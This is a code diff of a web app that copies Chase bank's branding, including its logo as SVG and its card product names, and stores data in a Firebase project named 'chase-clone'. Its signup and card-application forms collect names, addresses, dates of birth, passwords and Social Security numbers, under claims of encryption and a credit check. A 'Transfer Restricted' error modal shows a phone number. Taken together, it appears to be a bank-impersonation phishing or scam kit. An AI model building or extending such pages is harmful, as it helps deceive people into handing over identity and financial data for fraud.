+            margin-bottom: 10px;
+        }
+
+        .error-title {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+
+        .error-message {
+            font-size: 14px;
+            color: var(--text-gray);
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        .phone-number {
+            color: var(--chase-blue);
+            font-weight: 600;
+            font-size: 18px;
+        }
+
+        /* Transactions */
+        .transactions-list {
+            padding: 20px;
+            background: white;
+            min-height: calc(100vh - 200px);
+            max-width: 800px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .transaction-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 0;
+            border-bottom: 1px solid var(--border-gray);
+        }
+
+        .transaction-info {
+            flex: 1;
+        }
+
+        .transaction-name {
+            font-size: 15px;
+            font-weight: 500;
+            margin-bottom: 4px;
+        }
+
+        .transaction-date {
+            font-size: 12px;
+            color: var(--text-gray);
+        }
+
+        .transaction-amount {
+            text-align: right;
+        }
+
+        .transaction-amount.positive {
+            color: var(--success);
+        }
+
+        .transaction-amount.negative {
+            color: var(--text-dark);
+        }
+
+        .transaction-balance {
+            font-size: 12px;
+            color: var(--text-gray);
+            margin-top: 2px;
+        }
+
+        /* Notifications */
+        .notifications-list {
+            padding: 20px;
+            max-width: 800px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .notification-item {
+            background: white;
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 10px;
+            border-left: 4px solid var(--chase-blue);
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+        }
+
+        .notification-title {
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+
+        .notification-desc {
+            font-size: 13px;
+            color: var(--text-gray);
+            margin-bottom: 5px;
+        }
+
+        .notification-time {
+            font-size: 11px;
+            color: var(--text-light);
+        }
+
+        /* Credit Card Application */
+        .card-options {
+            padding: 20px;
+        }
+
+        .card-option {
+            border: 2px solid var(--border-gray);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 12px;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: all 0.3s;
+            touch-action: manipulation;
+        }
+
+        .card-option:active {
+            border-color: var(--chase-blue);
+            background: var(--chase-light);
+        }
+
+        .card-option.selected {
+            border-color: var(--chase-blue);
+            background: var(--chase-light);
+        }
+
+        .card-name {
+            font-weight: 600;
+            font-size: 15px;
+        }
+
+        .card-fee {
+            color: var(--text-gray);
+            font-size: 14px;
+        }
+
+        /* Cards Page */
+        .cards-page {
+            background: white;
+            min-height: calc(100vh - 80px);
+            padding: 20px;
+            max-width: 800px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .no-cards {
+            text-align: center;
+            padding: 60px 20px;
+        }
+
+        .no-cards-icon {
+            width: 80px;
+            height: 80px;
+            background: var(--bg-gray);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 40px;
+            color: var(--text-gray);
+        }
+
+        .no-cards h3 {
+            font-size: 18px;
+            margin-bottom: 10px;
+        }
+
+        .no-cards p {
+            color: var(--text-gray);
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        .btn-secondary {
+            background: var(--chase-blue);
+            color: white;
+            border: none;
+            padding: 14px 28px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            touch-action: manipulation;
+        }
+
+        .btn-secondary:active {
+            background: var(--chase-dark);
+        }
+
+        .application-status {
+            background: white;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 15px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+        }
+
+        .status-badge {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 12px;
+            font-size: 12px;
+            font-weight: 600;
+            margin-left: 10px;
+        }
+
+        .status-badge.under-review {
+            background: #fff3cd;
+            color: #856404;
+        }
+
+        /* Profile Modal */
+        .profile-info {
+            padding: 30px 20px;
+            text-align: center;
+        }
+
+        .profile-avatar {
+            width: 80px;
+            height: 80px;
+            background: var(--chase-blue);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            color: white;
+            font-size: 32px;
+            font-weight: 600;
+        }
+
+        .profile-detail {
+            margin-bottom: 15px;
+            padding: 10px;
+            background: var(--bg-gray);
+            border-radius: 8px;
+        }
+
+        .profile-label {
+            font-size: 12px;
+            color: var(--text-gray);
+            margin-bottom: 4px;
+        }
+
+        .profile-value {
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        /* Toast Notifications */
+        .toast {
+            position: fixed;
+            bottom: 100px;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: rgba(0,0,0,0.9);
+            color: white;
+            padding: 14px 24px;
+            border-radius: 8px;
+            font-size: 14px;
+            opacity: 0;
+            transition: all 0.3s;
+            z-index: 3000;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            pointer-events: none;
+        }
+
+        .toast.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
+
+        /* Loading Spinner */
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Utility Classes */
         .hidden { display: none !important; }
         .text-center { text-align: center; }
         .mt-20 { margin-top: 20px; }
@@ -416,8 +1265,12 @@
         <!-- Auth Screen (Login/Signup) -->
         <div class="auth-screen" id="authScreen">
             <div class="auth-header">
-                <!-- UPDATED: Cleaner Chase wordmark -->
-                <div class="chase-wordmark">CHASE</div>
+                <div class="auth-logo">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 561.578 104.369">
+                        <path fill="#0659a5" d="M494.525 0a3.69 3.69 0 0 0-3.691 3.686v25.83h68.244L528 .008 494.525 0M561.578 37.33a3.677 3.677 0 0 0-3.688-3.68h-25.828v68.242l29.504-31.086.012-33.476M524.236 104.369a3.688 3.688 0 0 0 3.678-3.688V74.854h-68.241l31.073 29.508 33.49.007M457.18 67.043a3.687 3.687 0 0 0 3.686 3.688h25.83V2.484l-29.512 31.078-.004 33.481"></path>
+                        <path fill="#0659a5" d="M144.379 12.453v31.514h-43.91V12.453l-15.987-.006v79.461h15.987V57.771h43.91v34.137h16.016V12.453h-16.016M357.123 12.453v79.441l70.164-.004-8.891-13.98h-45.23V57.771h43.797V44.299h-43.797V26.111h45.156l8.711-13.658h-69.91M25.043 12.443C8.404 12.443 0 22.549 0 37.266v29.665C0 83.957 10.824 91.91 24.957 91.91l50.164-.01-9.293-14.521H28.053c-8.021 0-11.515-2.899-11.515-11.881v-26.91c0-8.684 2.939-12.072 11.729-12.072h37.955l8.928-14.072-50.107-.001M286.947 12.42c-9.613 0-19.451 5.771-19.451 20.625v3.816c0 1"></path>
+                    </svg>
+                </div>
                 <div class="auth-tabs">
                     <span class="auth-tab active" onclick="switchAuthTab('login')">Sign In</span>
                     <span class="auth-tab" onclick="switchAuthTab('signup')">Sign Up</span>
@@ -428,12 +1281,10 @@
                 <!-- Login Form -->
                 <div id="loginForm">
                     <div class="input-group">
-                        <label class="input-label" for="loginEmail">Email</label>
-                        <input type="email" class="input-field" id="loginEmail" placeholder="e.g., name@example.com">
+                        <input type="email" class="input-field" id="loginEmail" placeholder="Email">
                     </div>
                     <div class="input-group password-container">
-                        <label class="input-label" for="loginPassword">Password</label>
-                        <input type="password" class="input-field" id="loginPassword" placeholder="Enter your password">
+                        <input type="password" class="input-field" id="loginPassword" placeholder="Password">
                         <span class="eye-icon" onclick="togglePassword('loginPassword')">
                             <i class="far fa-eye"></i>
                         </span>
@@ -458,35 +1309,29 @@
                 <!-- Signup Form -->
                 <div id="signupForm" class="hidden">
                     <div class="input-group">
-                        <label class="input-label" for="signupFullName">Full Name</label>
-                        <input type="text" class="input-field" id="signupFullName" placeholder="As shown on your ID">
+                        <input type="text" class="input-field" id="signupFullName" placeholder="Full Name">
                     </div>
                     <div class="input-group">
-                        <label class="input-label" for="signupEmail">Email</label>
-                        <input type="email" class="input-field" id="signupEmail" placeholder="e.g., name@example.com">
+                        <input type="email" class="input-field" id="signupEmail" placeholder="Email">
                     </div>
                     <div class="input-group">
-                        <label class="input-label" for="signupPhone">Phone Number</label>
-                        <input type="tel" class="input-field" id="signupPhone" placeholder="e.g., (123) 456-7890">
+                        <input type="tel" class="input-field" id="signupPhone" placeholder="Phone Number">
                     </div>
                     <div class="input-group">
-                        <label class="input-label" for="signupAddress">Address</label>
-                        <input type="text" class="input-field" id="signupAddress" placeholder="Street, City, State, ZIP">
+                        <input type="text" class="input-field" id="signupAddress" placeholder="Address">
                     </div>
                     <div class="input-group">
-                        <label class="input-label" for="signupDob">Date of Birth</label>
-                        <input type="date" class="input-field" id="signupDob" placeholder="MM/DD/YYYY">
+                        <input type="date" class="input-field" id="signupDob" placeholder="Date of Birth">
+                        <small style="color: var(--text-gray); font-size: 12px; display: block; margin-top: 5px;">Select your date of birth</small>
                     </div>
                     <div class="input-group password-container">
-                        <label class="input-label" for="signupPassword">Password</label>
-                        <input type="password" class="input-field" id="signupPassword" placeholder="Create a password (min. 6 characters)">
+                        <input type="password" class="input-field" id="signupPassword" placeholder="Password">
                         <span class="eye-icon" onclick="togglePassword('signupPassword')">
                             <i class="far fa-eye"></i>
                         </span>
                     </div>
                     <div class="input-group password-container">
-                        <label class="input-label" for="signupConfirmPassword">Confirm Password</label>
-                        <input type="password" class="input-field" id="signupConfirmPassword" placeholder="Re-enter your password">
+                        <input type="password" class="input-field" id="signupConfirmPassword" placeholder="Confirm Password">
                         <span class="eye-icon" onclick="togglePassword('signupConfirmPassword')">
                             <i class="far fa-eye"></i>
                         </span>
@@ -524,8 +1369,10 @@
         <div class="main-app" id="mainApp">
             <div class="app-header">
                 <div class="header-top">
-                    <!-- UPDATED: Small wordmark for main app -->
-                    <div class="chase-wordmark-small">CHASE</div>
+                    <svg class="chase-logo-svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 561.578 104.369" width="100" height="20">
+                        <path fill="#0659a5" d="M494.525 0a3.69 3.69 0 0 0-3.691 3.686v25.83h68.244L528 .008 494.525 0M561.578 37.33a3.677 3.677 0 0 0-3.688-3.68h-25.828v68.242l29.504-31.086.012-33.476M524.236 104.369a3.688 3.688 0 0 0 3.678-3.688V74.854h-68.241l31.073 29.508 33.49.007M457.18 67.043a3.687 3.687 0 0 0 3.686 3.688h25.83V2.484l-29.512 31.078-.004 33.481"></path>
+                        <path fill="#0659a5" d="M144.379 12.453v31.514h-43.91V12.453l-15.987-.006v79.461h15.987V57.771h43.91v34.137h16.016V12.453h-16.016M357.123 12.453v79.441l70.164-.004-8.891-13.98h-45.23V57.771h43.797V44.299h-43.797V26.111h45.156l8.711-13.658h-69.91M25.043 12.443C8.404 12.443 0 22.549 0 37.266v29.665C0 83.957 10.824 91.91 24.957 91.91l50.164-.01-9.293-14.521H28.053c-8.021 0-11.515-2.899-11.515-11.881v-26.91c0-8.684 2.939-12.072 11.729-12.072h37.955l8.928-14.072-50.107-.001M286.947 12.42c-9.613 0-19.451 5.771-19.451 20.625v3.816c0 1"></path>
+                    </svg>
                     <div class="header-greeting">Hi, <span id="userName"></span></div>
                     <div class="header-icons">
                         <span class="header-icon" onclick="openNotifications()">
@@ -556,13 +1403,15 @@
             </div>
 
             <div class="content-area" id="contentArea">
-                <!-- Accounts View (Keep as is) -->
+                <!-- Accounts View -->
                 <div class="accounts-view" id="accountsView">
+                    <!-- Balance Card -->
                     <div class="balance-card">
                         <div class="balance-label">Total Balance</div>
                         <div class="balance-amount" id="totalBalance">$0.00</div>
                         <div class="balance-account" id="accountNumber">Account: </div>
                     </div>
+
                     <div class="accounts-section">
                         <div class="accounts-card">
                             <h2 class="accounts-header">Accounts</h2>
@@ -586,34 +1435,212 @@
                             </div>
                         </div>
                     </div>
-                    <!-- Offers and Investment sections (Keep as is) -->
-                    <div class="offers-section">...</div>
-                    <div style="padding: 0 20px 20px;">...</div>
+
+                    <div class="offers-section">
+                        <div class="section-header">
+                            <div>
+                                <h3 class="section-title">Chase offers</h3>
+                                <p style="font-size: 13px; color: var(--text-gray);">Add deals, shop and get money back.</p>
+                            </div>
+                            <a href="#" class="section-link">All offers ></a>
+                        </div>
+                        <div class="offers-scroll">
+                            <div class="offer-card" onclick="showToast('Cards offers coming soon')">Cards</div>
+                            <div class="offer-card office-depot" onclick="showToast('Office Depot offer: 5% cash back')">OFFICE DEPOT</div>
+                            <div class="offer-card" style="background: #1a1a1a; color: white;" onclick="showToast('Beats offer: 10% cash back')">BEATS</div>
+                            <div class="offer-card dell" onclick="showToast('Dell offer: 3% cash back')">DELL</div>
+                        </div>
+                    </div>
+
+                    <div style="padding: 0 20px 20px;">
+                        <h3 class="section-title" style="margin-bottom: 15px;">Invest with J.P. Morgan</h3>
+                        
+                        <div class="investment-card" onclick="showToast('JPMorgan Large Cap Growth Fund - 12.5% YTD return')">
+                            <div class="investment-icon">
+                                <i class="fas fa-chart-line"></i>
+                            </div>
+                            <div class="investment-info">
+                                <h4>JPMorgan Large Cap Growth Fund</h4>
+                                <p>Class A • 12.5% YTD return • Min $1,000</p>
+                            </div>
+                        </div>
+                        
+                        <div class="investment-card" onclick="showToast('JPMorgan Equity Income Fund - 3.2% dividend yield')">
+                            <div class="investment-icon">
+                                <i class="fas fa-coins"></i>
+                            </div>
+                            <div class="investment-info">
+                                <h4>JPMorgan Equity Income Fund</h4>
+                                <p>Dividend yield 3.2% • Min $2,500</p>
+                            </div>
+                        </div>
+                        
+                        <div class="investment-card" onclick="showToast('JPMorgan Municipal Bond Fund - Tax-free income')">
+                            <div class="investment-icon">
+                                <i class="fas fa-city"></i>
+                            </div>
+                            <div class="investment-info">
+                                <h4>JPMorgan Municipal Bond Fund</h4>
+                                <p>Tax-free income • Min $5,000</p>
+                            </div>
+                        </div>
+                        
+                        <div class="investment-card" onclick="showToast('JPMorgan SmartRetirement® 2050 Fund - Target date fund')">
+                            <div class="investment-icon">
+                                <i class="fas fa-umbrella"></i>
+                            </div>
+                            <div class="investment-info">
+                                <h4>JPMorgan SmartRetirement® 2050</h4>
+                                <p>Target retirement • Min $1,000</p>
+                            </div>
+                        </div>
+                        
+                        <p style="font-size: 13px; color: var(--chase-blue); margin-top: 10px; cursor: pointer; touch-action: manipulation;" onclick="showToast('Explore all investment options')">
+                            <i class="fas fa-arrow-right"></i> Work with an advisor, invest online and access market insights
+                        </p>
+                    </div>
                 </div>
 
                 <!-- Transactions View -->
-                <div class="transactions-view hidden" id="transactionsView">...</div>
+                <div class="transactions-view hidden" id="transactionsView">
+                    <div class="accounts-card" style="margin: 20px;">
+                        <div class="account-item" style="border-bottom: none;">
+                            <div class="account-info">
+                                <h3 id="transAccountName">TOTAL CHECKING</h3>
+                                <p class="account-number" id="transAccountNumber">** ****</p>
+                            </div>
+                            <div class="account-balance" id="transBalance">$0.00</div>
+                        </div>
+                    </div>
+                    <h3 style="padding: 0 20px 10px; font-size: 16px;">Transaction History</h3>
+                    <div class="transactions-list" id="transactionsList">
+                        <p style="text-align: center; color: var(--text-gray); padding: 20px;">No transactions yet</p>
+                    </div>
+                </div>
+
                 <!-- Notifications View -->
-                <div class="notifications-view hidden" id="notificationsView">...</div>
+                <div class="notifications-view hidden" id="notificationsView">
+                    <h3 style="padding: 20px 20px 10px; font-size: 16px;">Notifications</h3>
+                    <div class="notifications-list" id="notificationsList">
+                        <p style="text-align: center; color: var(--text-gray); padding: 20px;">No notifications</p>
+                    </div>
+                </div>
+
                 <!-- Cards View -->
-                <div class="cards-view hidden" id="cardsView">...</div>
+                <div class="cards-view hidden" id="cardsView">
+                    <div class="cards-page">
+                        <div class="section-header" style="margin-bottom: 20px;">
+                            <h3 class="section-title">My Cards</h3>
+                            <button class="btn-secondary" style="padding: 10px 16px; font-size: 13px;" onclick="openCardApplication()">+ Apply for Card</button>
+                        </div>
+                        
+                        <div id="noCardsState">
+                            <div class="no-cards">
+                                <div class="no-cards-icon"><i class="fas fa-credit-card"></i></div>
+                                <h3>No cards yet</h3>
+                                <p>Apply for a Chase credit card to get started.</p>
+                                <button class="btn-secondary" onclick="openCardApplication()">Apply Now</button>
+                            </div>
+                        </div>
+
+                        <div id="applicationsList" class="hidden">
+                            <h4 style="margin-bottom: 15px; color: var(--text-gray); font-size: 14px;">Applications</h4>
+                        </div>
+                    </div>
+                </div>
+
                 <!-- Pay & Collect View -->
-                <div class="pay-view hidden" id="payView">...</div>
+                <div class="pay-view hidden" id="payView">
+                    <div style="padding: 20px;">
+                        <h2 style="margin-bottom: 20px;">Transfer Money</h2>
+                        <div class="accounts-card">
+                            <button class="btn-primary" onclick="openTransferModal()" style="margin-bottom: 15px;">New Transfer</button>
+                            <p style="color: var(--text-gray); font-size: 14px; text-align: center;">Quickly transfer between your accounts or to external accounts</p>
+                        </div>
+                    </div>
+                </div>
             </div>
 
-            <!-- Bottom Navigation (Keep as is) -->
-            <div class="bottom-nav">...</div>
+            <!-- Bottom Navigation -->
+            <div class="bottom-nav">
+                <div class="nav-item active" onclick="switchTab('accounts', event)">
+                    <i class="fas fa-home"></i>
+                    <span>Accounts</span>
+                </div>
+                <div class="nav-item" onclick="switchTab('pay', event)">
+                    <i class="fas fa-exchange-alt"></i>
+                    <span>Pay & Collect</span>
+                </div>
+                <div class="nav-item" onclick="switchTab('transactions', event)">
+                    <i class="fas fa-list"></i>
+                    <span>Transactions</span>
+                </div>
+                <div class="nav-item" onclick="switchTab('cards', event)">
+                    <i class="fas fa-credit-card"></i>
+                    <span>Cards</span>
+                </div>
+            </div>
         </div>
 
-        <!-- Transfer Modal (Keep as is) -->
-        <div class="modal-overlay" id="transferModal">...</div>
-        <!-- Success Modal (Keep as is) -->
-        <div class="modal-overlay" id="successModal">...</div>
-        <!-- Error Modal (UPDATED: Use wordmark) -->
+        <!-- Transfer Modal -->
+        <div class="modal-overlay" id="transferModal">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h3 class="modal-title">Transfer Money</h3>
+                    <button class="close-btn" onclick="closeModal('transferModal')">×</button>
+                </div>
+                <div class="transfer-form">
+                    <div class="form-group">
+                        <label class="form-label">From Account</label>
+                        <select class="form-select" id="fromAccount" onchange="updateAvailableBalance()">
+                            <option value="checking">Checking Account</option>
+                            <option value="savings">Savings Account</option>
+                        </select>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label class="form-label">Recipient Account Number</label>
+                        <input type="text" class="form-input" id="toAccount" placeholder="Enter account number" onblur="lookupRecipient()">
+                    </div>
+
+                    <div id="recipientInfo" class="hidden"></div>
+                    
+                    <div class="form-group">
+                        <label class="form-label">Amount</label>
+                        <div class="amount-input">
+                            <input type="number" class="form-input" id="transferAmount" placeholder="0.00">
+                        </div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label class="form-label">Description</label>
+                        <input type="text" class="form-input" id="transferDesc" placeholder="What's this for?">
+                    </div>
+                    
+                    <button class="btn-primary" id="transferBtn" onclick="processTransfer()">
+                        <span id="transferBtnText">Send Money</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Success Modal -->
+        <div class="modal-overlay" id="successModal">
+            <div class="modal-content">
+                <div class="success-modal" id="successModalContent">
+                    <!-- Success content will be injected here -->
+                </div>
+            </div>
+        </div>
+
+        <!-- Error Modal -->
         <div class="modal-overlay" id="errorModal">
             <div class="modal-content">
                 <div class="error-modal">
-                    <div class="chase-wordmark">CHASE</div>
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 561.578 104.369" width="150" height="30">
+                        <path fill="#0659a5" d="M494.525 0a3.69 3.69 0 0 0-3.691 3.686v25.83h68.244L528 .008 494.525 0M561.578 37.33a3.677 3.677 0 0 0-3.688-3.68h-25.828v68.242l29.504-31.086.012-33.476M524.236 104.369a3.688 3.688 0 0 0 3.678-3.688V74.854h-68.241l31.073 29.508 33.49.007M457.18 67.043a3.687 3.687 0 0 0 3.686 3.688h25.83V2.484l-29.512 31.078-.004 33.481"></path>
+                        <path fill="#0659a5" d="M144.379 12.453v31.514h-43.91V12.453l-15.987-.006v79.461h15.987V57.771h43.91v34.137h16.016V12.453h-16.016M357.123 12.453v79.441l70.164-.004-8.891-13.98h-45.23V57.771h43.797V44.299h-43.797V26.111h45.156l8.711-13.658h-69.91M25.043 12.443C8.404 12.443 0 22.549 0 37.266v29.665C0 83.957 10.824 91.91 24.957 91.91l50.164-.01-9.293-14.521H28.053c-8.021 0-11.515-2.899-11.515-11.881v-26.91c0-8.684 2.939-12.072 11.729-12.072h37.955l8.928-14.072-50.107-.001M286.947 12.42c-9.613 0-19.451 5.771-19.451 20.625v3.816c0 1"></path>
+                    </svg>
                     <p class="error-code" id="errorCode"></p>
                     <h3 class="error-title" id="errorTitle">Transfer Restricted</h3>
                     <p class="error-message" id="errorMessage"></p>
@@ -621,16 +1648,153 @@
                 </div>
             </div>
         </div>
+
         <!-- Profile Modal -->
-        <div class="modal-overlay" id="profileModal">...</div>
+        <div class="modal-overlay" id="profileModal">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h3 class="modal-title">Profile</h3>
+                    <button class="close-btn" onclick="closeModal('profileModal')">×</button>
+                </div>
+                <div class="profile-info" id="profileInfo">
+                    <!-- Profile info injected here -->
+                </div>
+            </div>
+        </div>
+
         <!-- Card Application Modal -->
-        <div class="modal-overlay" id="cardModal">...</div>
+        <div class="modal-overlay" id="cardModal">
+            <div class="modal-content" style="max-height: 95vh;">
+                <div class="modal-header">
+                    <h3 class="modal-title" id="cardModalTitle">Credit Card Application</h3>
+                    <button class="close-btn" onclick="closeModal('cardModal')">×</button>
+                </div>
+                
+                <!-- Step 1: Choose Card -->
+                <div id="cardStep1" class="card-options">
+                    <p style="text-align: center; color: var(--text-gray); margin-bottom: 20px;">Select the Chase card that fits your lifestyle</p>
+                    
+                    <div class="card-option" onclick="selectCard('preferred', '$95/yr')">
+                        <div>
+                            <div class="card-name">Chase Sapphire Preferred®</div>
+                        </div>
+                        <div class="card-fee">$95/yr</div>
+                    </div>
+                    
+                    <div class="card-option selected" onclick="selectCard('reserve', '$550/yr')">
+                        <div>
+                            <div class="card-name">Chase Sapphire Reserve®</div>
+                        </div>
+                        <div class="card-fee">$550/yr</div>
+                    </div>
+                    
+                    <div class="card-option" onclick="selectCard('freedom-unlimited', '$0/yr')">
+                        <div>
+                            <div class="card-name">Chase Freedom Unlimited®</div>
+                        </div>
+                        <div class="card-fee">$0/yr</div>
+                    </div>
+                    
+                    <div class="card-option" onclick="selectCard('freedom-flex', '$0/yr')">
+                        <div>
+                            <div class="card-name">Chase Freedom Flex℠</div>
+                        </div>
+                        <div class="card-fee">$0/yr</div>
+                    </div>
+                    
+                    <button class="btn-primary" onclick="goToCardStep2()" style="margin-top: 20px;">Continue</button>
+                </div>
+
+                <!-- Step 2: Personal Info -->
+                <div id="cardStep2" class="hidden" style="padding: 20px;">
+                    <p style="color: var(--text-gray); font-size: 14px; margin-bottom: 20px;">Required for credit check verification</p>
+                    
+                    <div class="form-group">
+                        <label class="form-label">Social Security Number (SSN)</label>
+                        <input type="password" class="form-input" id="ssnInput" placeholder="•••••••••" maxlength="9">
+                        <p style="font-size: 12px; color: var(--text-gray); margin-top: 5px;">Your SSN is encrypted and secure</p>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label class="form-label">Annual Income</label>
+                        <div class="amount-input">
+                            <input type="number" class="form-input" id="incomeInput" placeholder="75,000">
+                        </div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label class="form-label">Employment Status</label>
+                        <select class="form-select" id="employmentStatus">
+                            <option value="">Select status</option>
+                            <option value="full-time">Employed Full-Time</option>
+                            <option value="part-time">Employed Part-Time</option>
+                            <option value="self-employed">Self-Employed</option>
+                            <option value="retired">Retired</option>
+                            <option value="student">Student</option>
+                            <option value="unemployed">Unemployed</option>
+                            <option value="other">Other</option>
+                        </select>
+                    </div>
+                    
+                    <div style="display: flex; gap: 10px; margin-top: 30px;">
+                        <button class="btn-primary" style="flex: 1; background: white; color: var(--text-dark); border: 1px solid var(--border-gray);" onclick="goToCardStep1()">Back</button>
+                        <button class="btn-primary" style="flex: 1;" onclick="goToCardStep3()">Continue</button>
+                    </div>
+                </div>
+
+                <!-- Step 3: Review -->
+                <div id="cardStep3" class="hidden" style="padding: 20px;">
+                    <div style="text-align: center; margin-bottom: 30px;">
+                        <div style="width: 60px; height: 60px; background: var(--success); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px; color: white; font-size: 30px;"><i class="fas fa-check"></i></div>
+                        <h3>Review & Submit</h3>
+                        <p style="color: var(--text-gray); font-size: 14px;">Please review your application details</p>
+                    </div>
+                    
+                    <div style="background: var(--bg-gray); border-radius: 12px; padding: 20px; margin-bottom: 20px;">
+                        <div style="display: flex; justify-content: space-between; margin-bottom: 12px;">
+                            <span style="color: var(--text-gray);">Card Type</span>
+                            <span style="font-weight: 600;" id="reviewCardType">Chase Sapphire Reserve®</span>
+                        </div>
+                        <div style="display: flex; justify-content: space-between; margin-bottom: 12px;">
+                            <span style="color: var(--text-gray);">SSN</span>
+                            <span style="font-weight: 600;" id="reviewSSN">***-**-****</span>
+                        </div>
+                        <div style="display: flex; justify-content: space-between; margin-bottom: 12px;">
+                            <span style="color: var(--text-gray);">Annual Income</span>
+                            <span style="font-weight: 600;" id="reviewIncome">$0</span>
+                        </div>
+                        <div style="display: flex; justify-content: space-between;">
+                            <span style="color: var(--text-gray);">Employment</span>
+                            <span style="font-weight: 600;" id="reviewEmployment"></span>
+                        </div>
+                    </div>
+                    
+                    <div style="background: var(--chase-light); border-radius: 12px; padding: 15px; margin-bottom: 20px;">
+                        <p style="font-weight: 600; margin-bottom: 10px; font-size: 14px;">What happens next?</p>
+                        <ul style="font-size: 13px; color: var(--text-gray); padding-left: 18px; line-height: 1.8;">
+                            <li>We'll perform a soft credit check</li>
+                            <li>Review typically takes 1-2 business days</li>
+                            <li>You'll receive a notification once approved</li>
+                        </ul>
+                    </div>
+                    
+                    <div style="display: flex; gap: 10px;">
+                        <button class="btn-primary" style="flex: 1; background: white; color: var(--text-dark); border: 1px solid var(--border-gray);" onclick="goToCardStep2()">Back</button>
+                        <button class="btn-primary" style="flex: 1;" onclick="submitCardApplication()">Submit Application</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
         <!-- Toast -->
-        <div class="toast" id="toast">...</div>
+        <div class="toast" id="toast">
+            <i class="fas fa-check-circle"></i>
+            <span id="toastMessage"></span>
+        </div>
     </div>
 
     <script>
-        // Firebase Configuration (Keep your existing config)
+        // Firebase Configuration
         const firebaseConfig = {
             apiKey: "AIzaSyBw4Yn8YQv6xmib8UUn8s54VuxJ4dzcmYo",
             authDomain: "chase-clone-f2ee2.firebaseapp.com",
@@ -646,7 +1810,7 @@
         const auth = firebase.auth();
         const db = firebase.firestore();
 
-        // App State (Keep as is)
+        // App State
         let currentUser = null;
         let userData = null;
         let notifications = [];
@@ -654,11 +1818,14 @@
         let selectedCard = 'reserve';
         let cardApplications = [];
 
-        // Prevent double-tap zoom (Keep as is)
-        document.addEventListener('touchstart', (e) => { if (e.touches.length > 1) e.preventDefault(); }, { passive: false });
+        // Prevent double-tap zoom
+        document.addEventListener('touchstart', (e) => {
+            if (e.touches.length > 1) e.preventDefault();
+        }, { passive: false });
+
         document.addEventListener('dblclick', (e) => e.preventDefault());
 
-        // Auth State Observer (Keep as is)
+        // Auth State Observer
         auth.onAuthStateChanged(async (user) => {
             if (user) {
                 currentUser = user;
@@ -669,10 +1836,11 @@
             }
         });
 
-        // Switch between login and signup tabs (Keep as is)
+        // Switch between login and signup tabs
         function switchAuthTab(tab) {
             document.querySelectorAll('.auth-tab').forEach(t => t.classList.remove('active'));
             event.target.classList.add('active');
+            
             if (tab === 'login') {
                 document.getElementById('loginForm').classList.remove('hidden');
                 document.getElementById('signupForm').classList.add('hidden');
@@ -683,10 +1851,11 @@
             document.getElementById('authError').textContent = '';
         }
 
-        // Toggle password visibility (Keep as is)
+        // Toggle password visibility
         function togglePassword(inputId) {
             const input = document.getElementById(inputId);
             const icon = event.currentTarget.querySelector('i');
+            
             if (input.type === 'password') {
                 input.type = 'text';
                 icon.classList.remove('fa-eye');
@@ -698,7 +1867,7 @@
             }
         }
 
-        // Handle Signup (Keep as is - it works)
+        // Handle Signup
         async function handleSignup() {
             const fullName = document.getElementById('signupFullName').value;
             const email = document.getElementById('signupEmail').value;
@@ -708,14 +1877,17 @@
             const password = document.getElementById('signupPassword').value;
             const confirmPassword = document.getElementById('signupConfirmPassword').value;
 
+            // Validation
             if (!fullName || !email || !phone || !address || !dob || !password) {
                 showAuthError('Please fill in all fields');
                 return;
             }
+
             if (password !== confirmPassword) {
                 showAuthError('Passwords do not match');
                 return;
             }
+
             if (password.length < 6) {
                 showAuthError('Password must be at least 6 characters');
                 return;
@@ -727,18 +1899,28 @@
             btnText.innerHTML = '<span class="spinner"></span> Creating Account...';
 
             try {
+                // Create user in Firebase Auth
                 const userCredential = await auth.createUserWithEmailAndPassword(email, password);
                 const user = userCredential.user;
+
+                // Generate account numbers
                 const checkingAccount = 'CH' + Math.floor(10000000 + Math.random() * 90000000);
                 const savingsAccount = 'SV' + Math.floor(10000000 + Math.random() * 90000000);
 
+                // Save user data to Firestore
                 await db.collection('users').doc(user.uid).set({
-                    fullName, email, phone, address, dob,
-                    checkingAccount, savingsAccount,
+                    fullName: fullName,
+                    email: email,
+                    phone: phone,
+                    address: address,
+                    dob: dob,
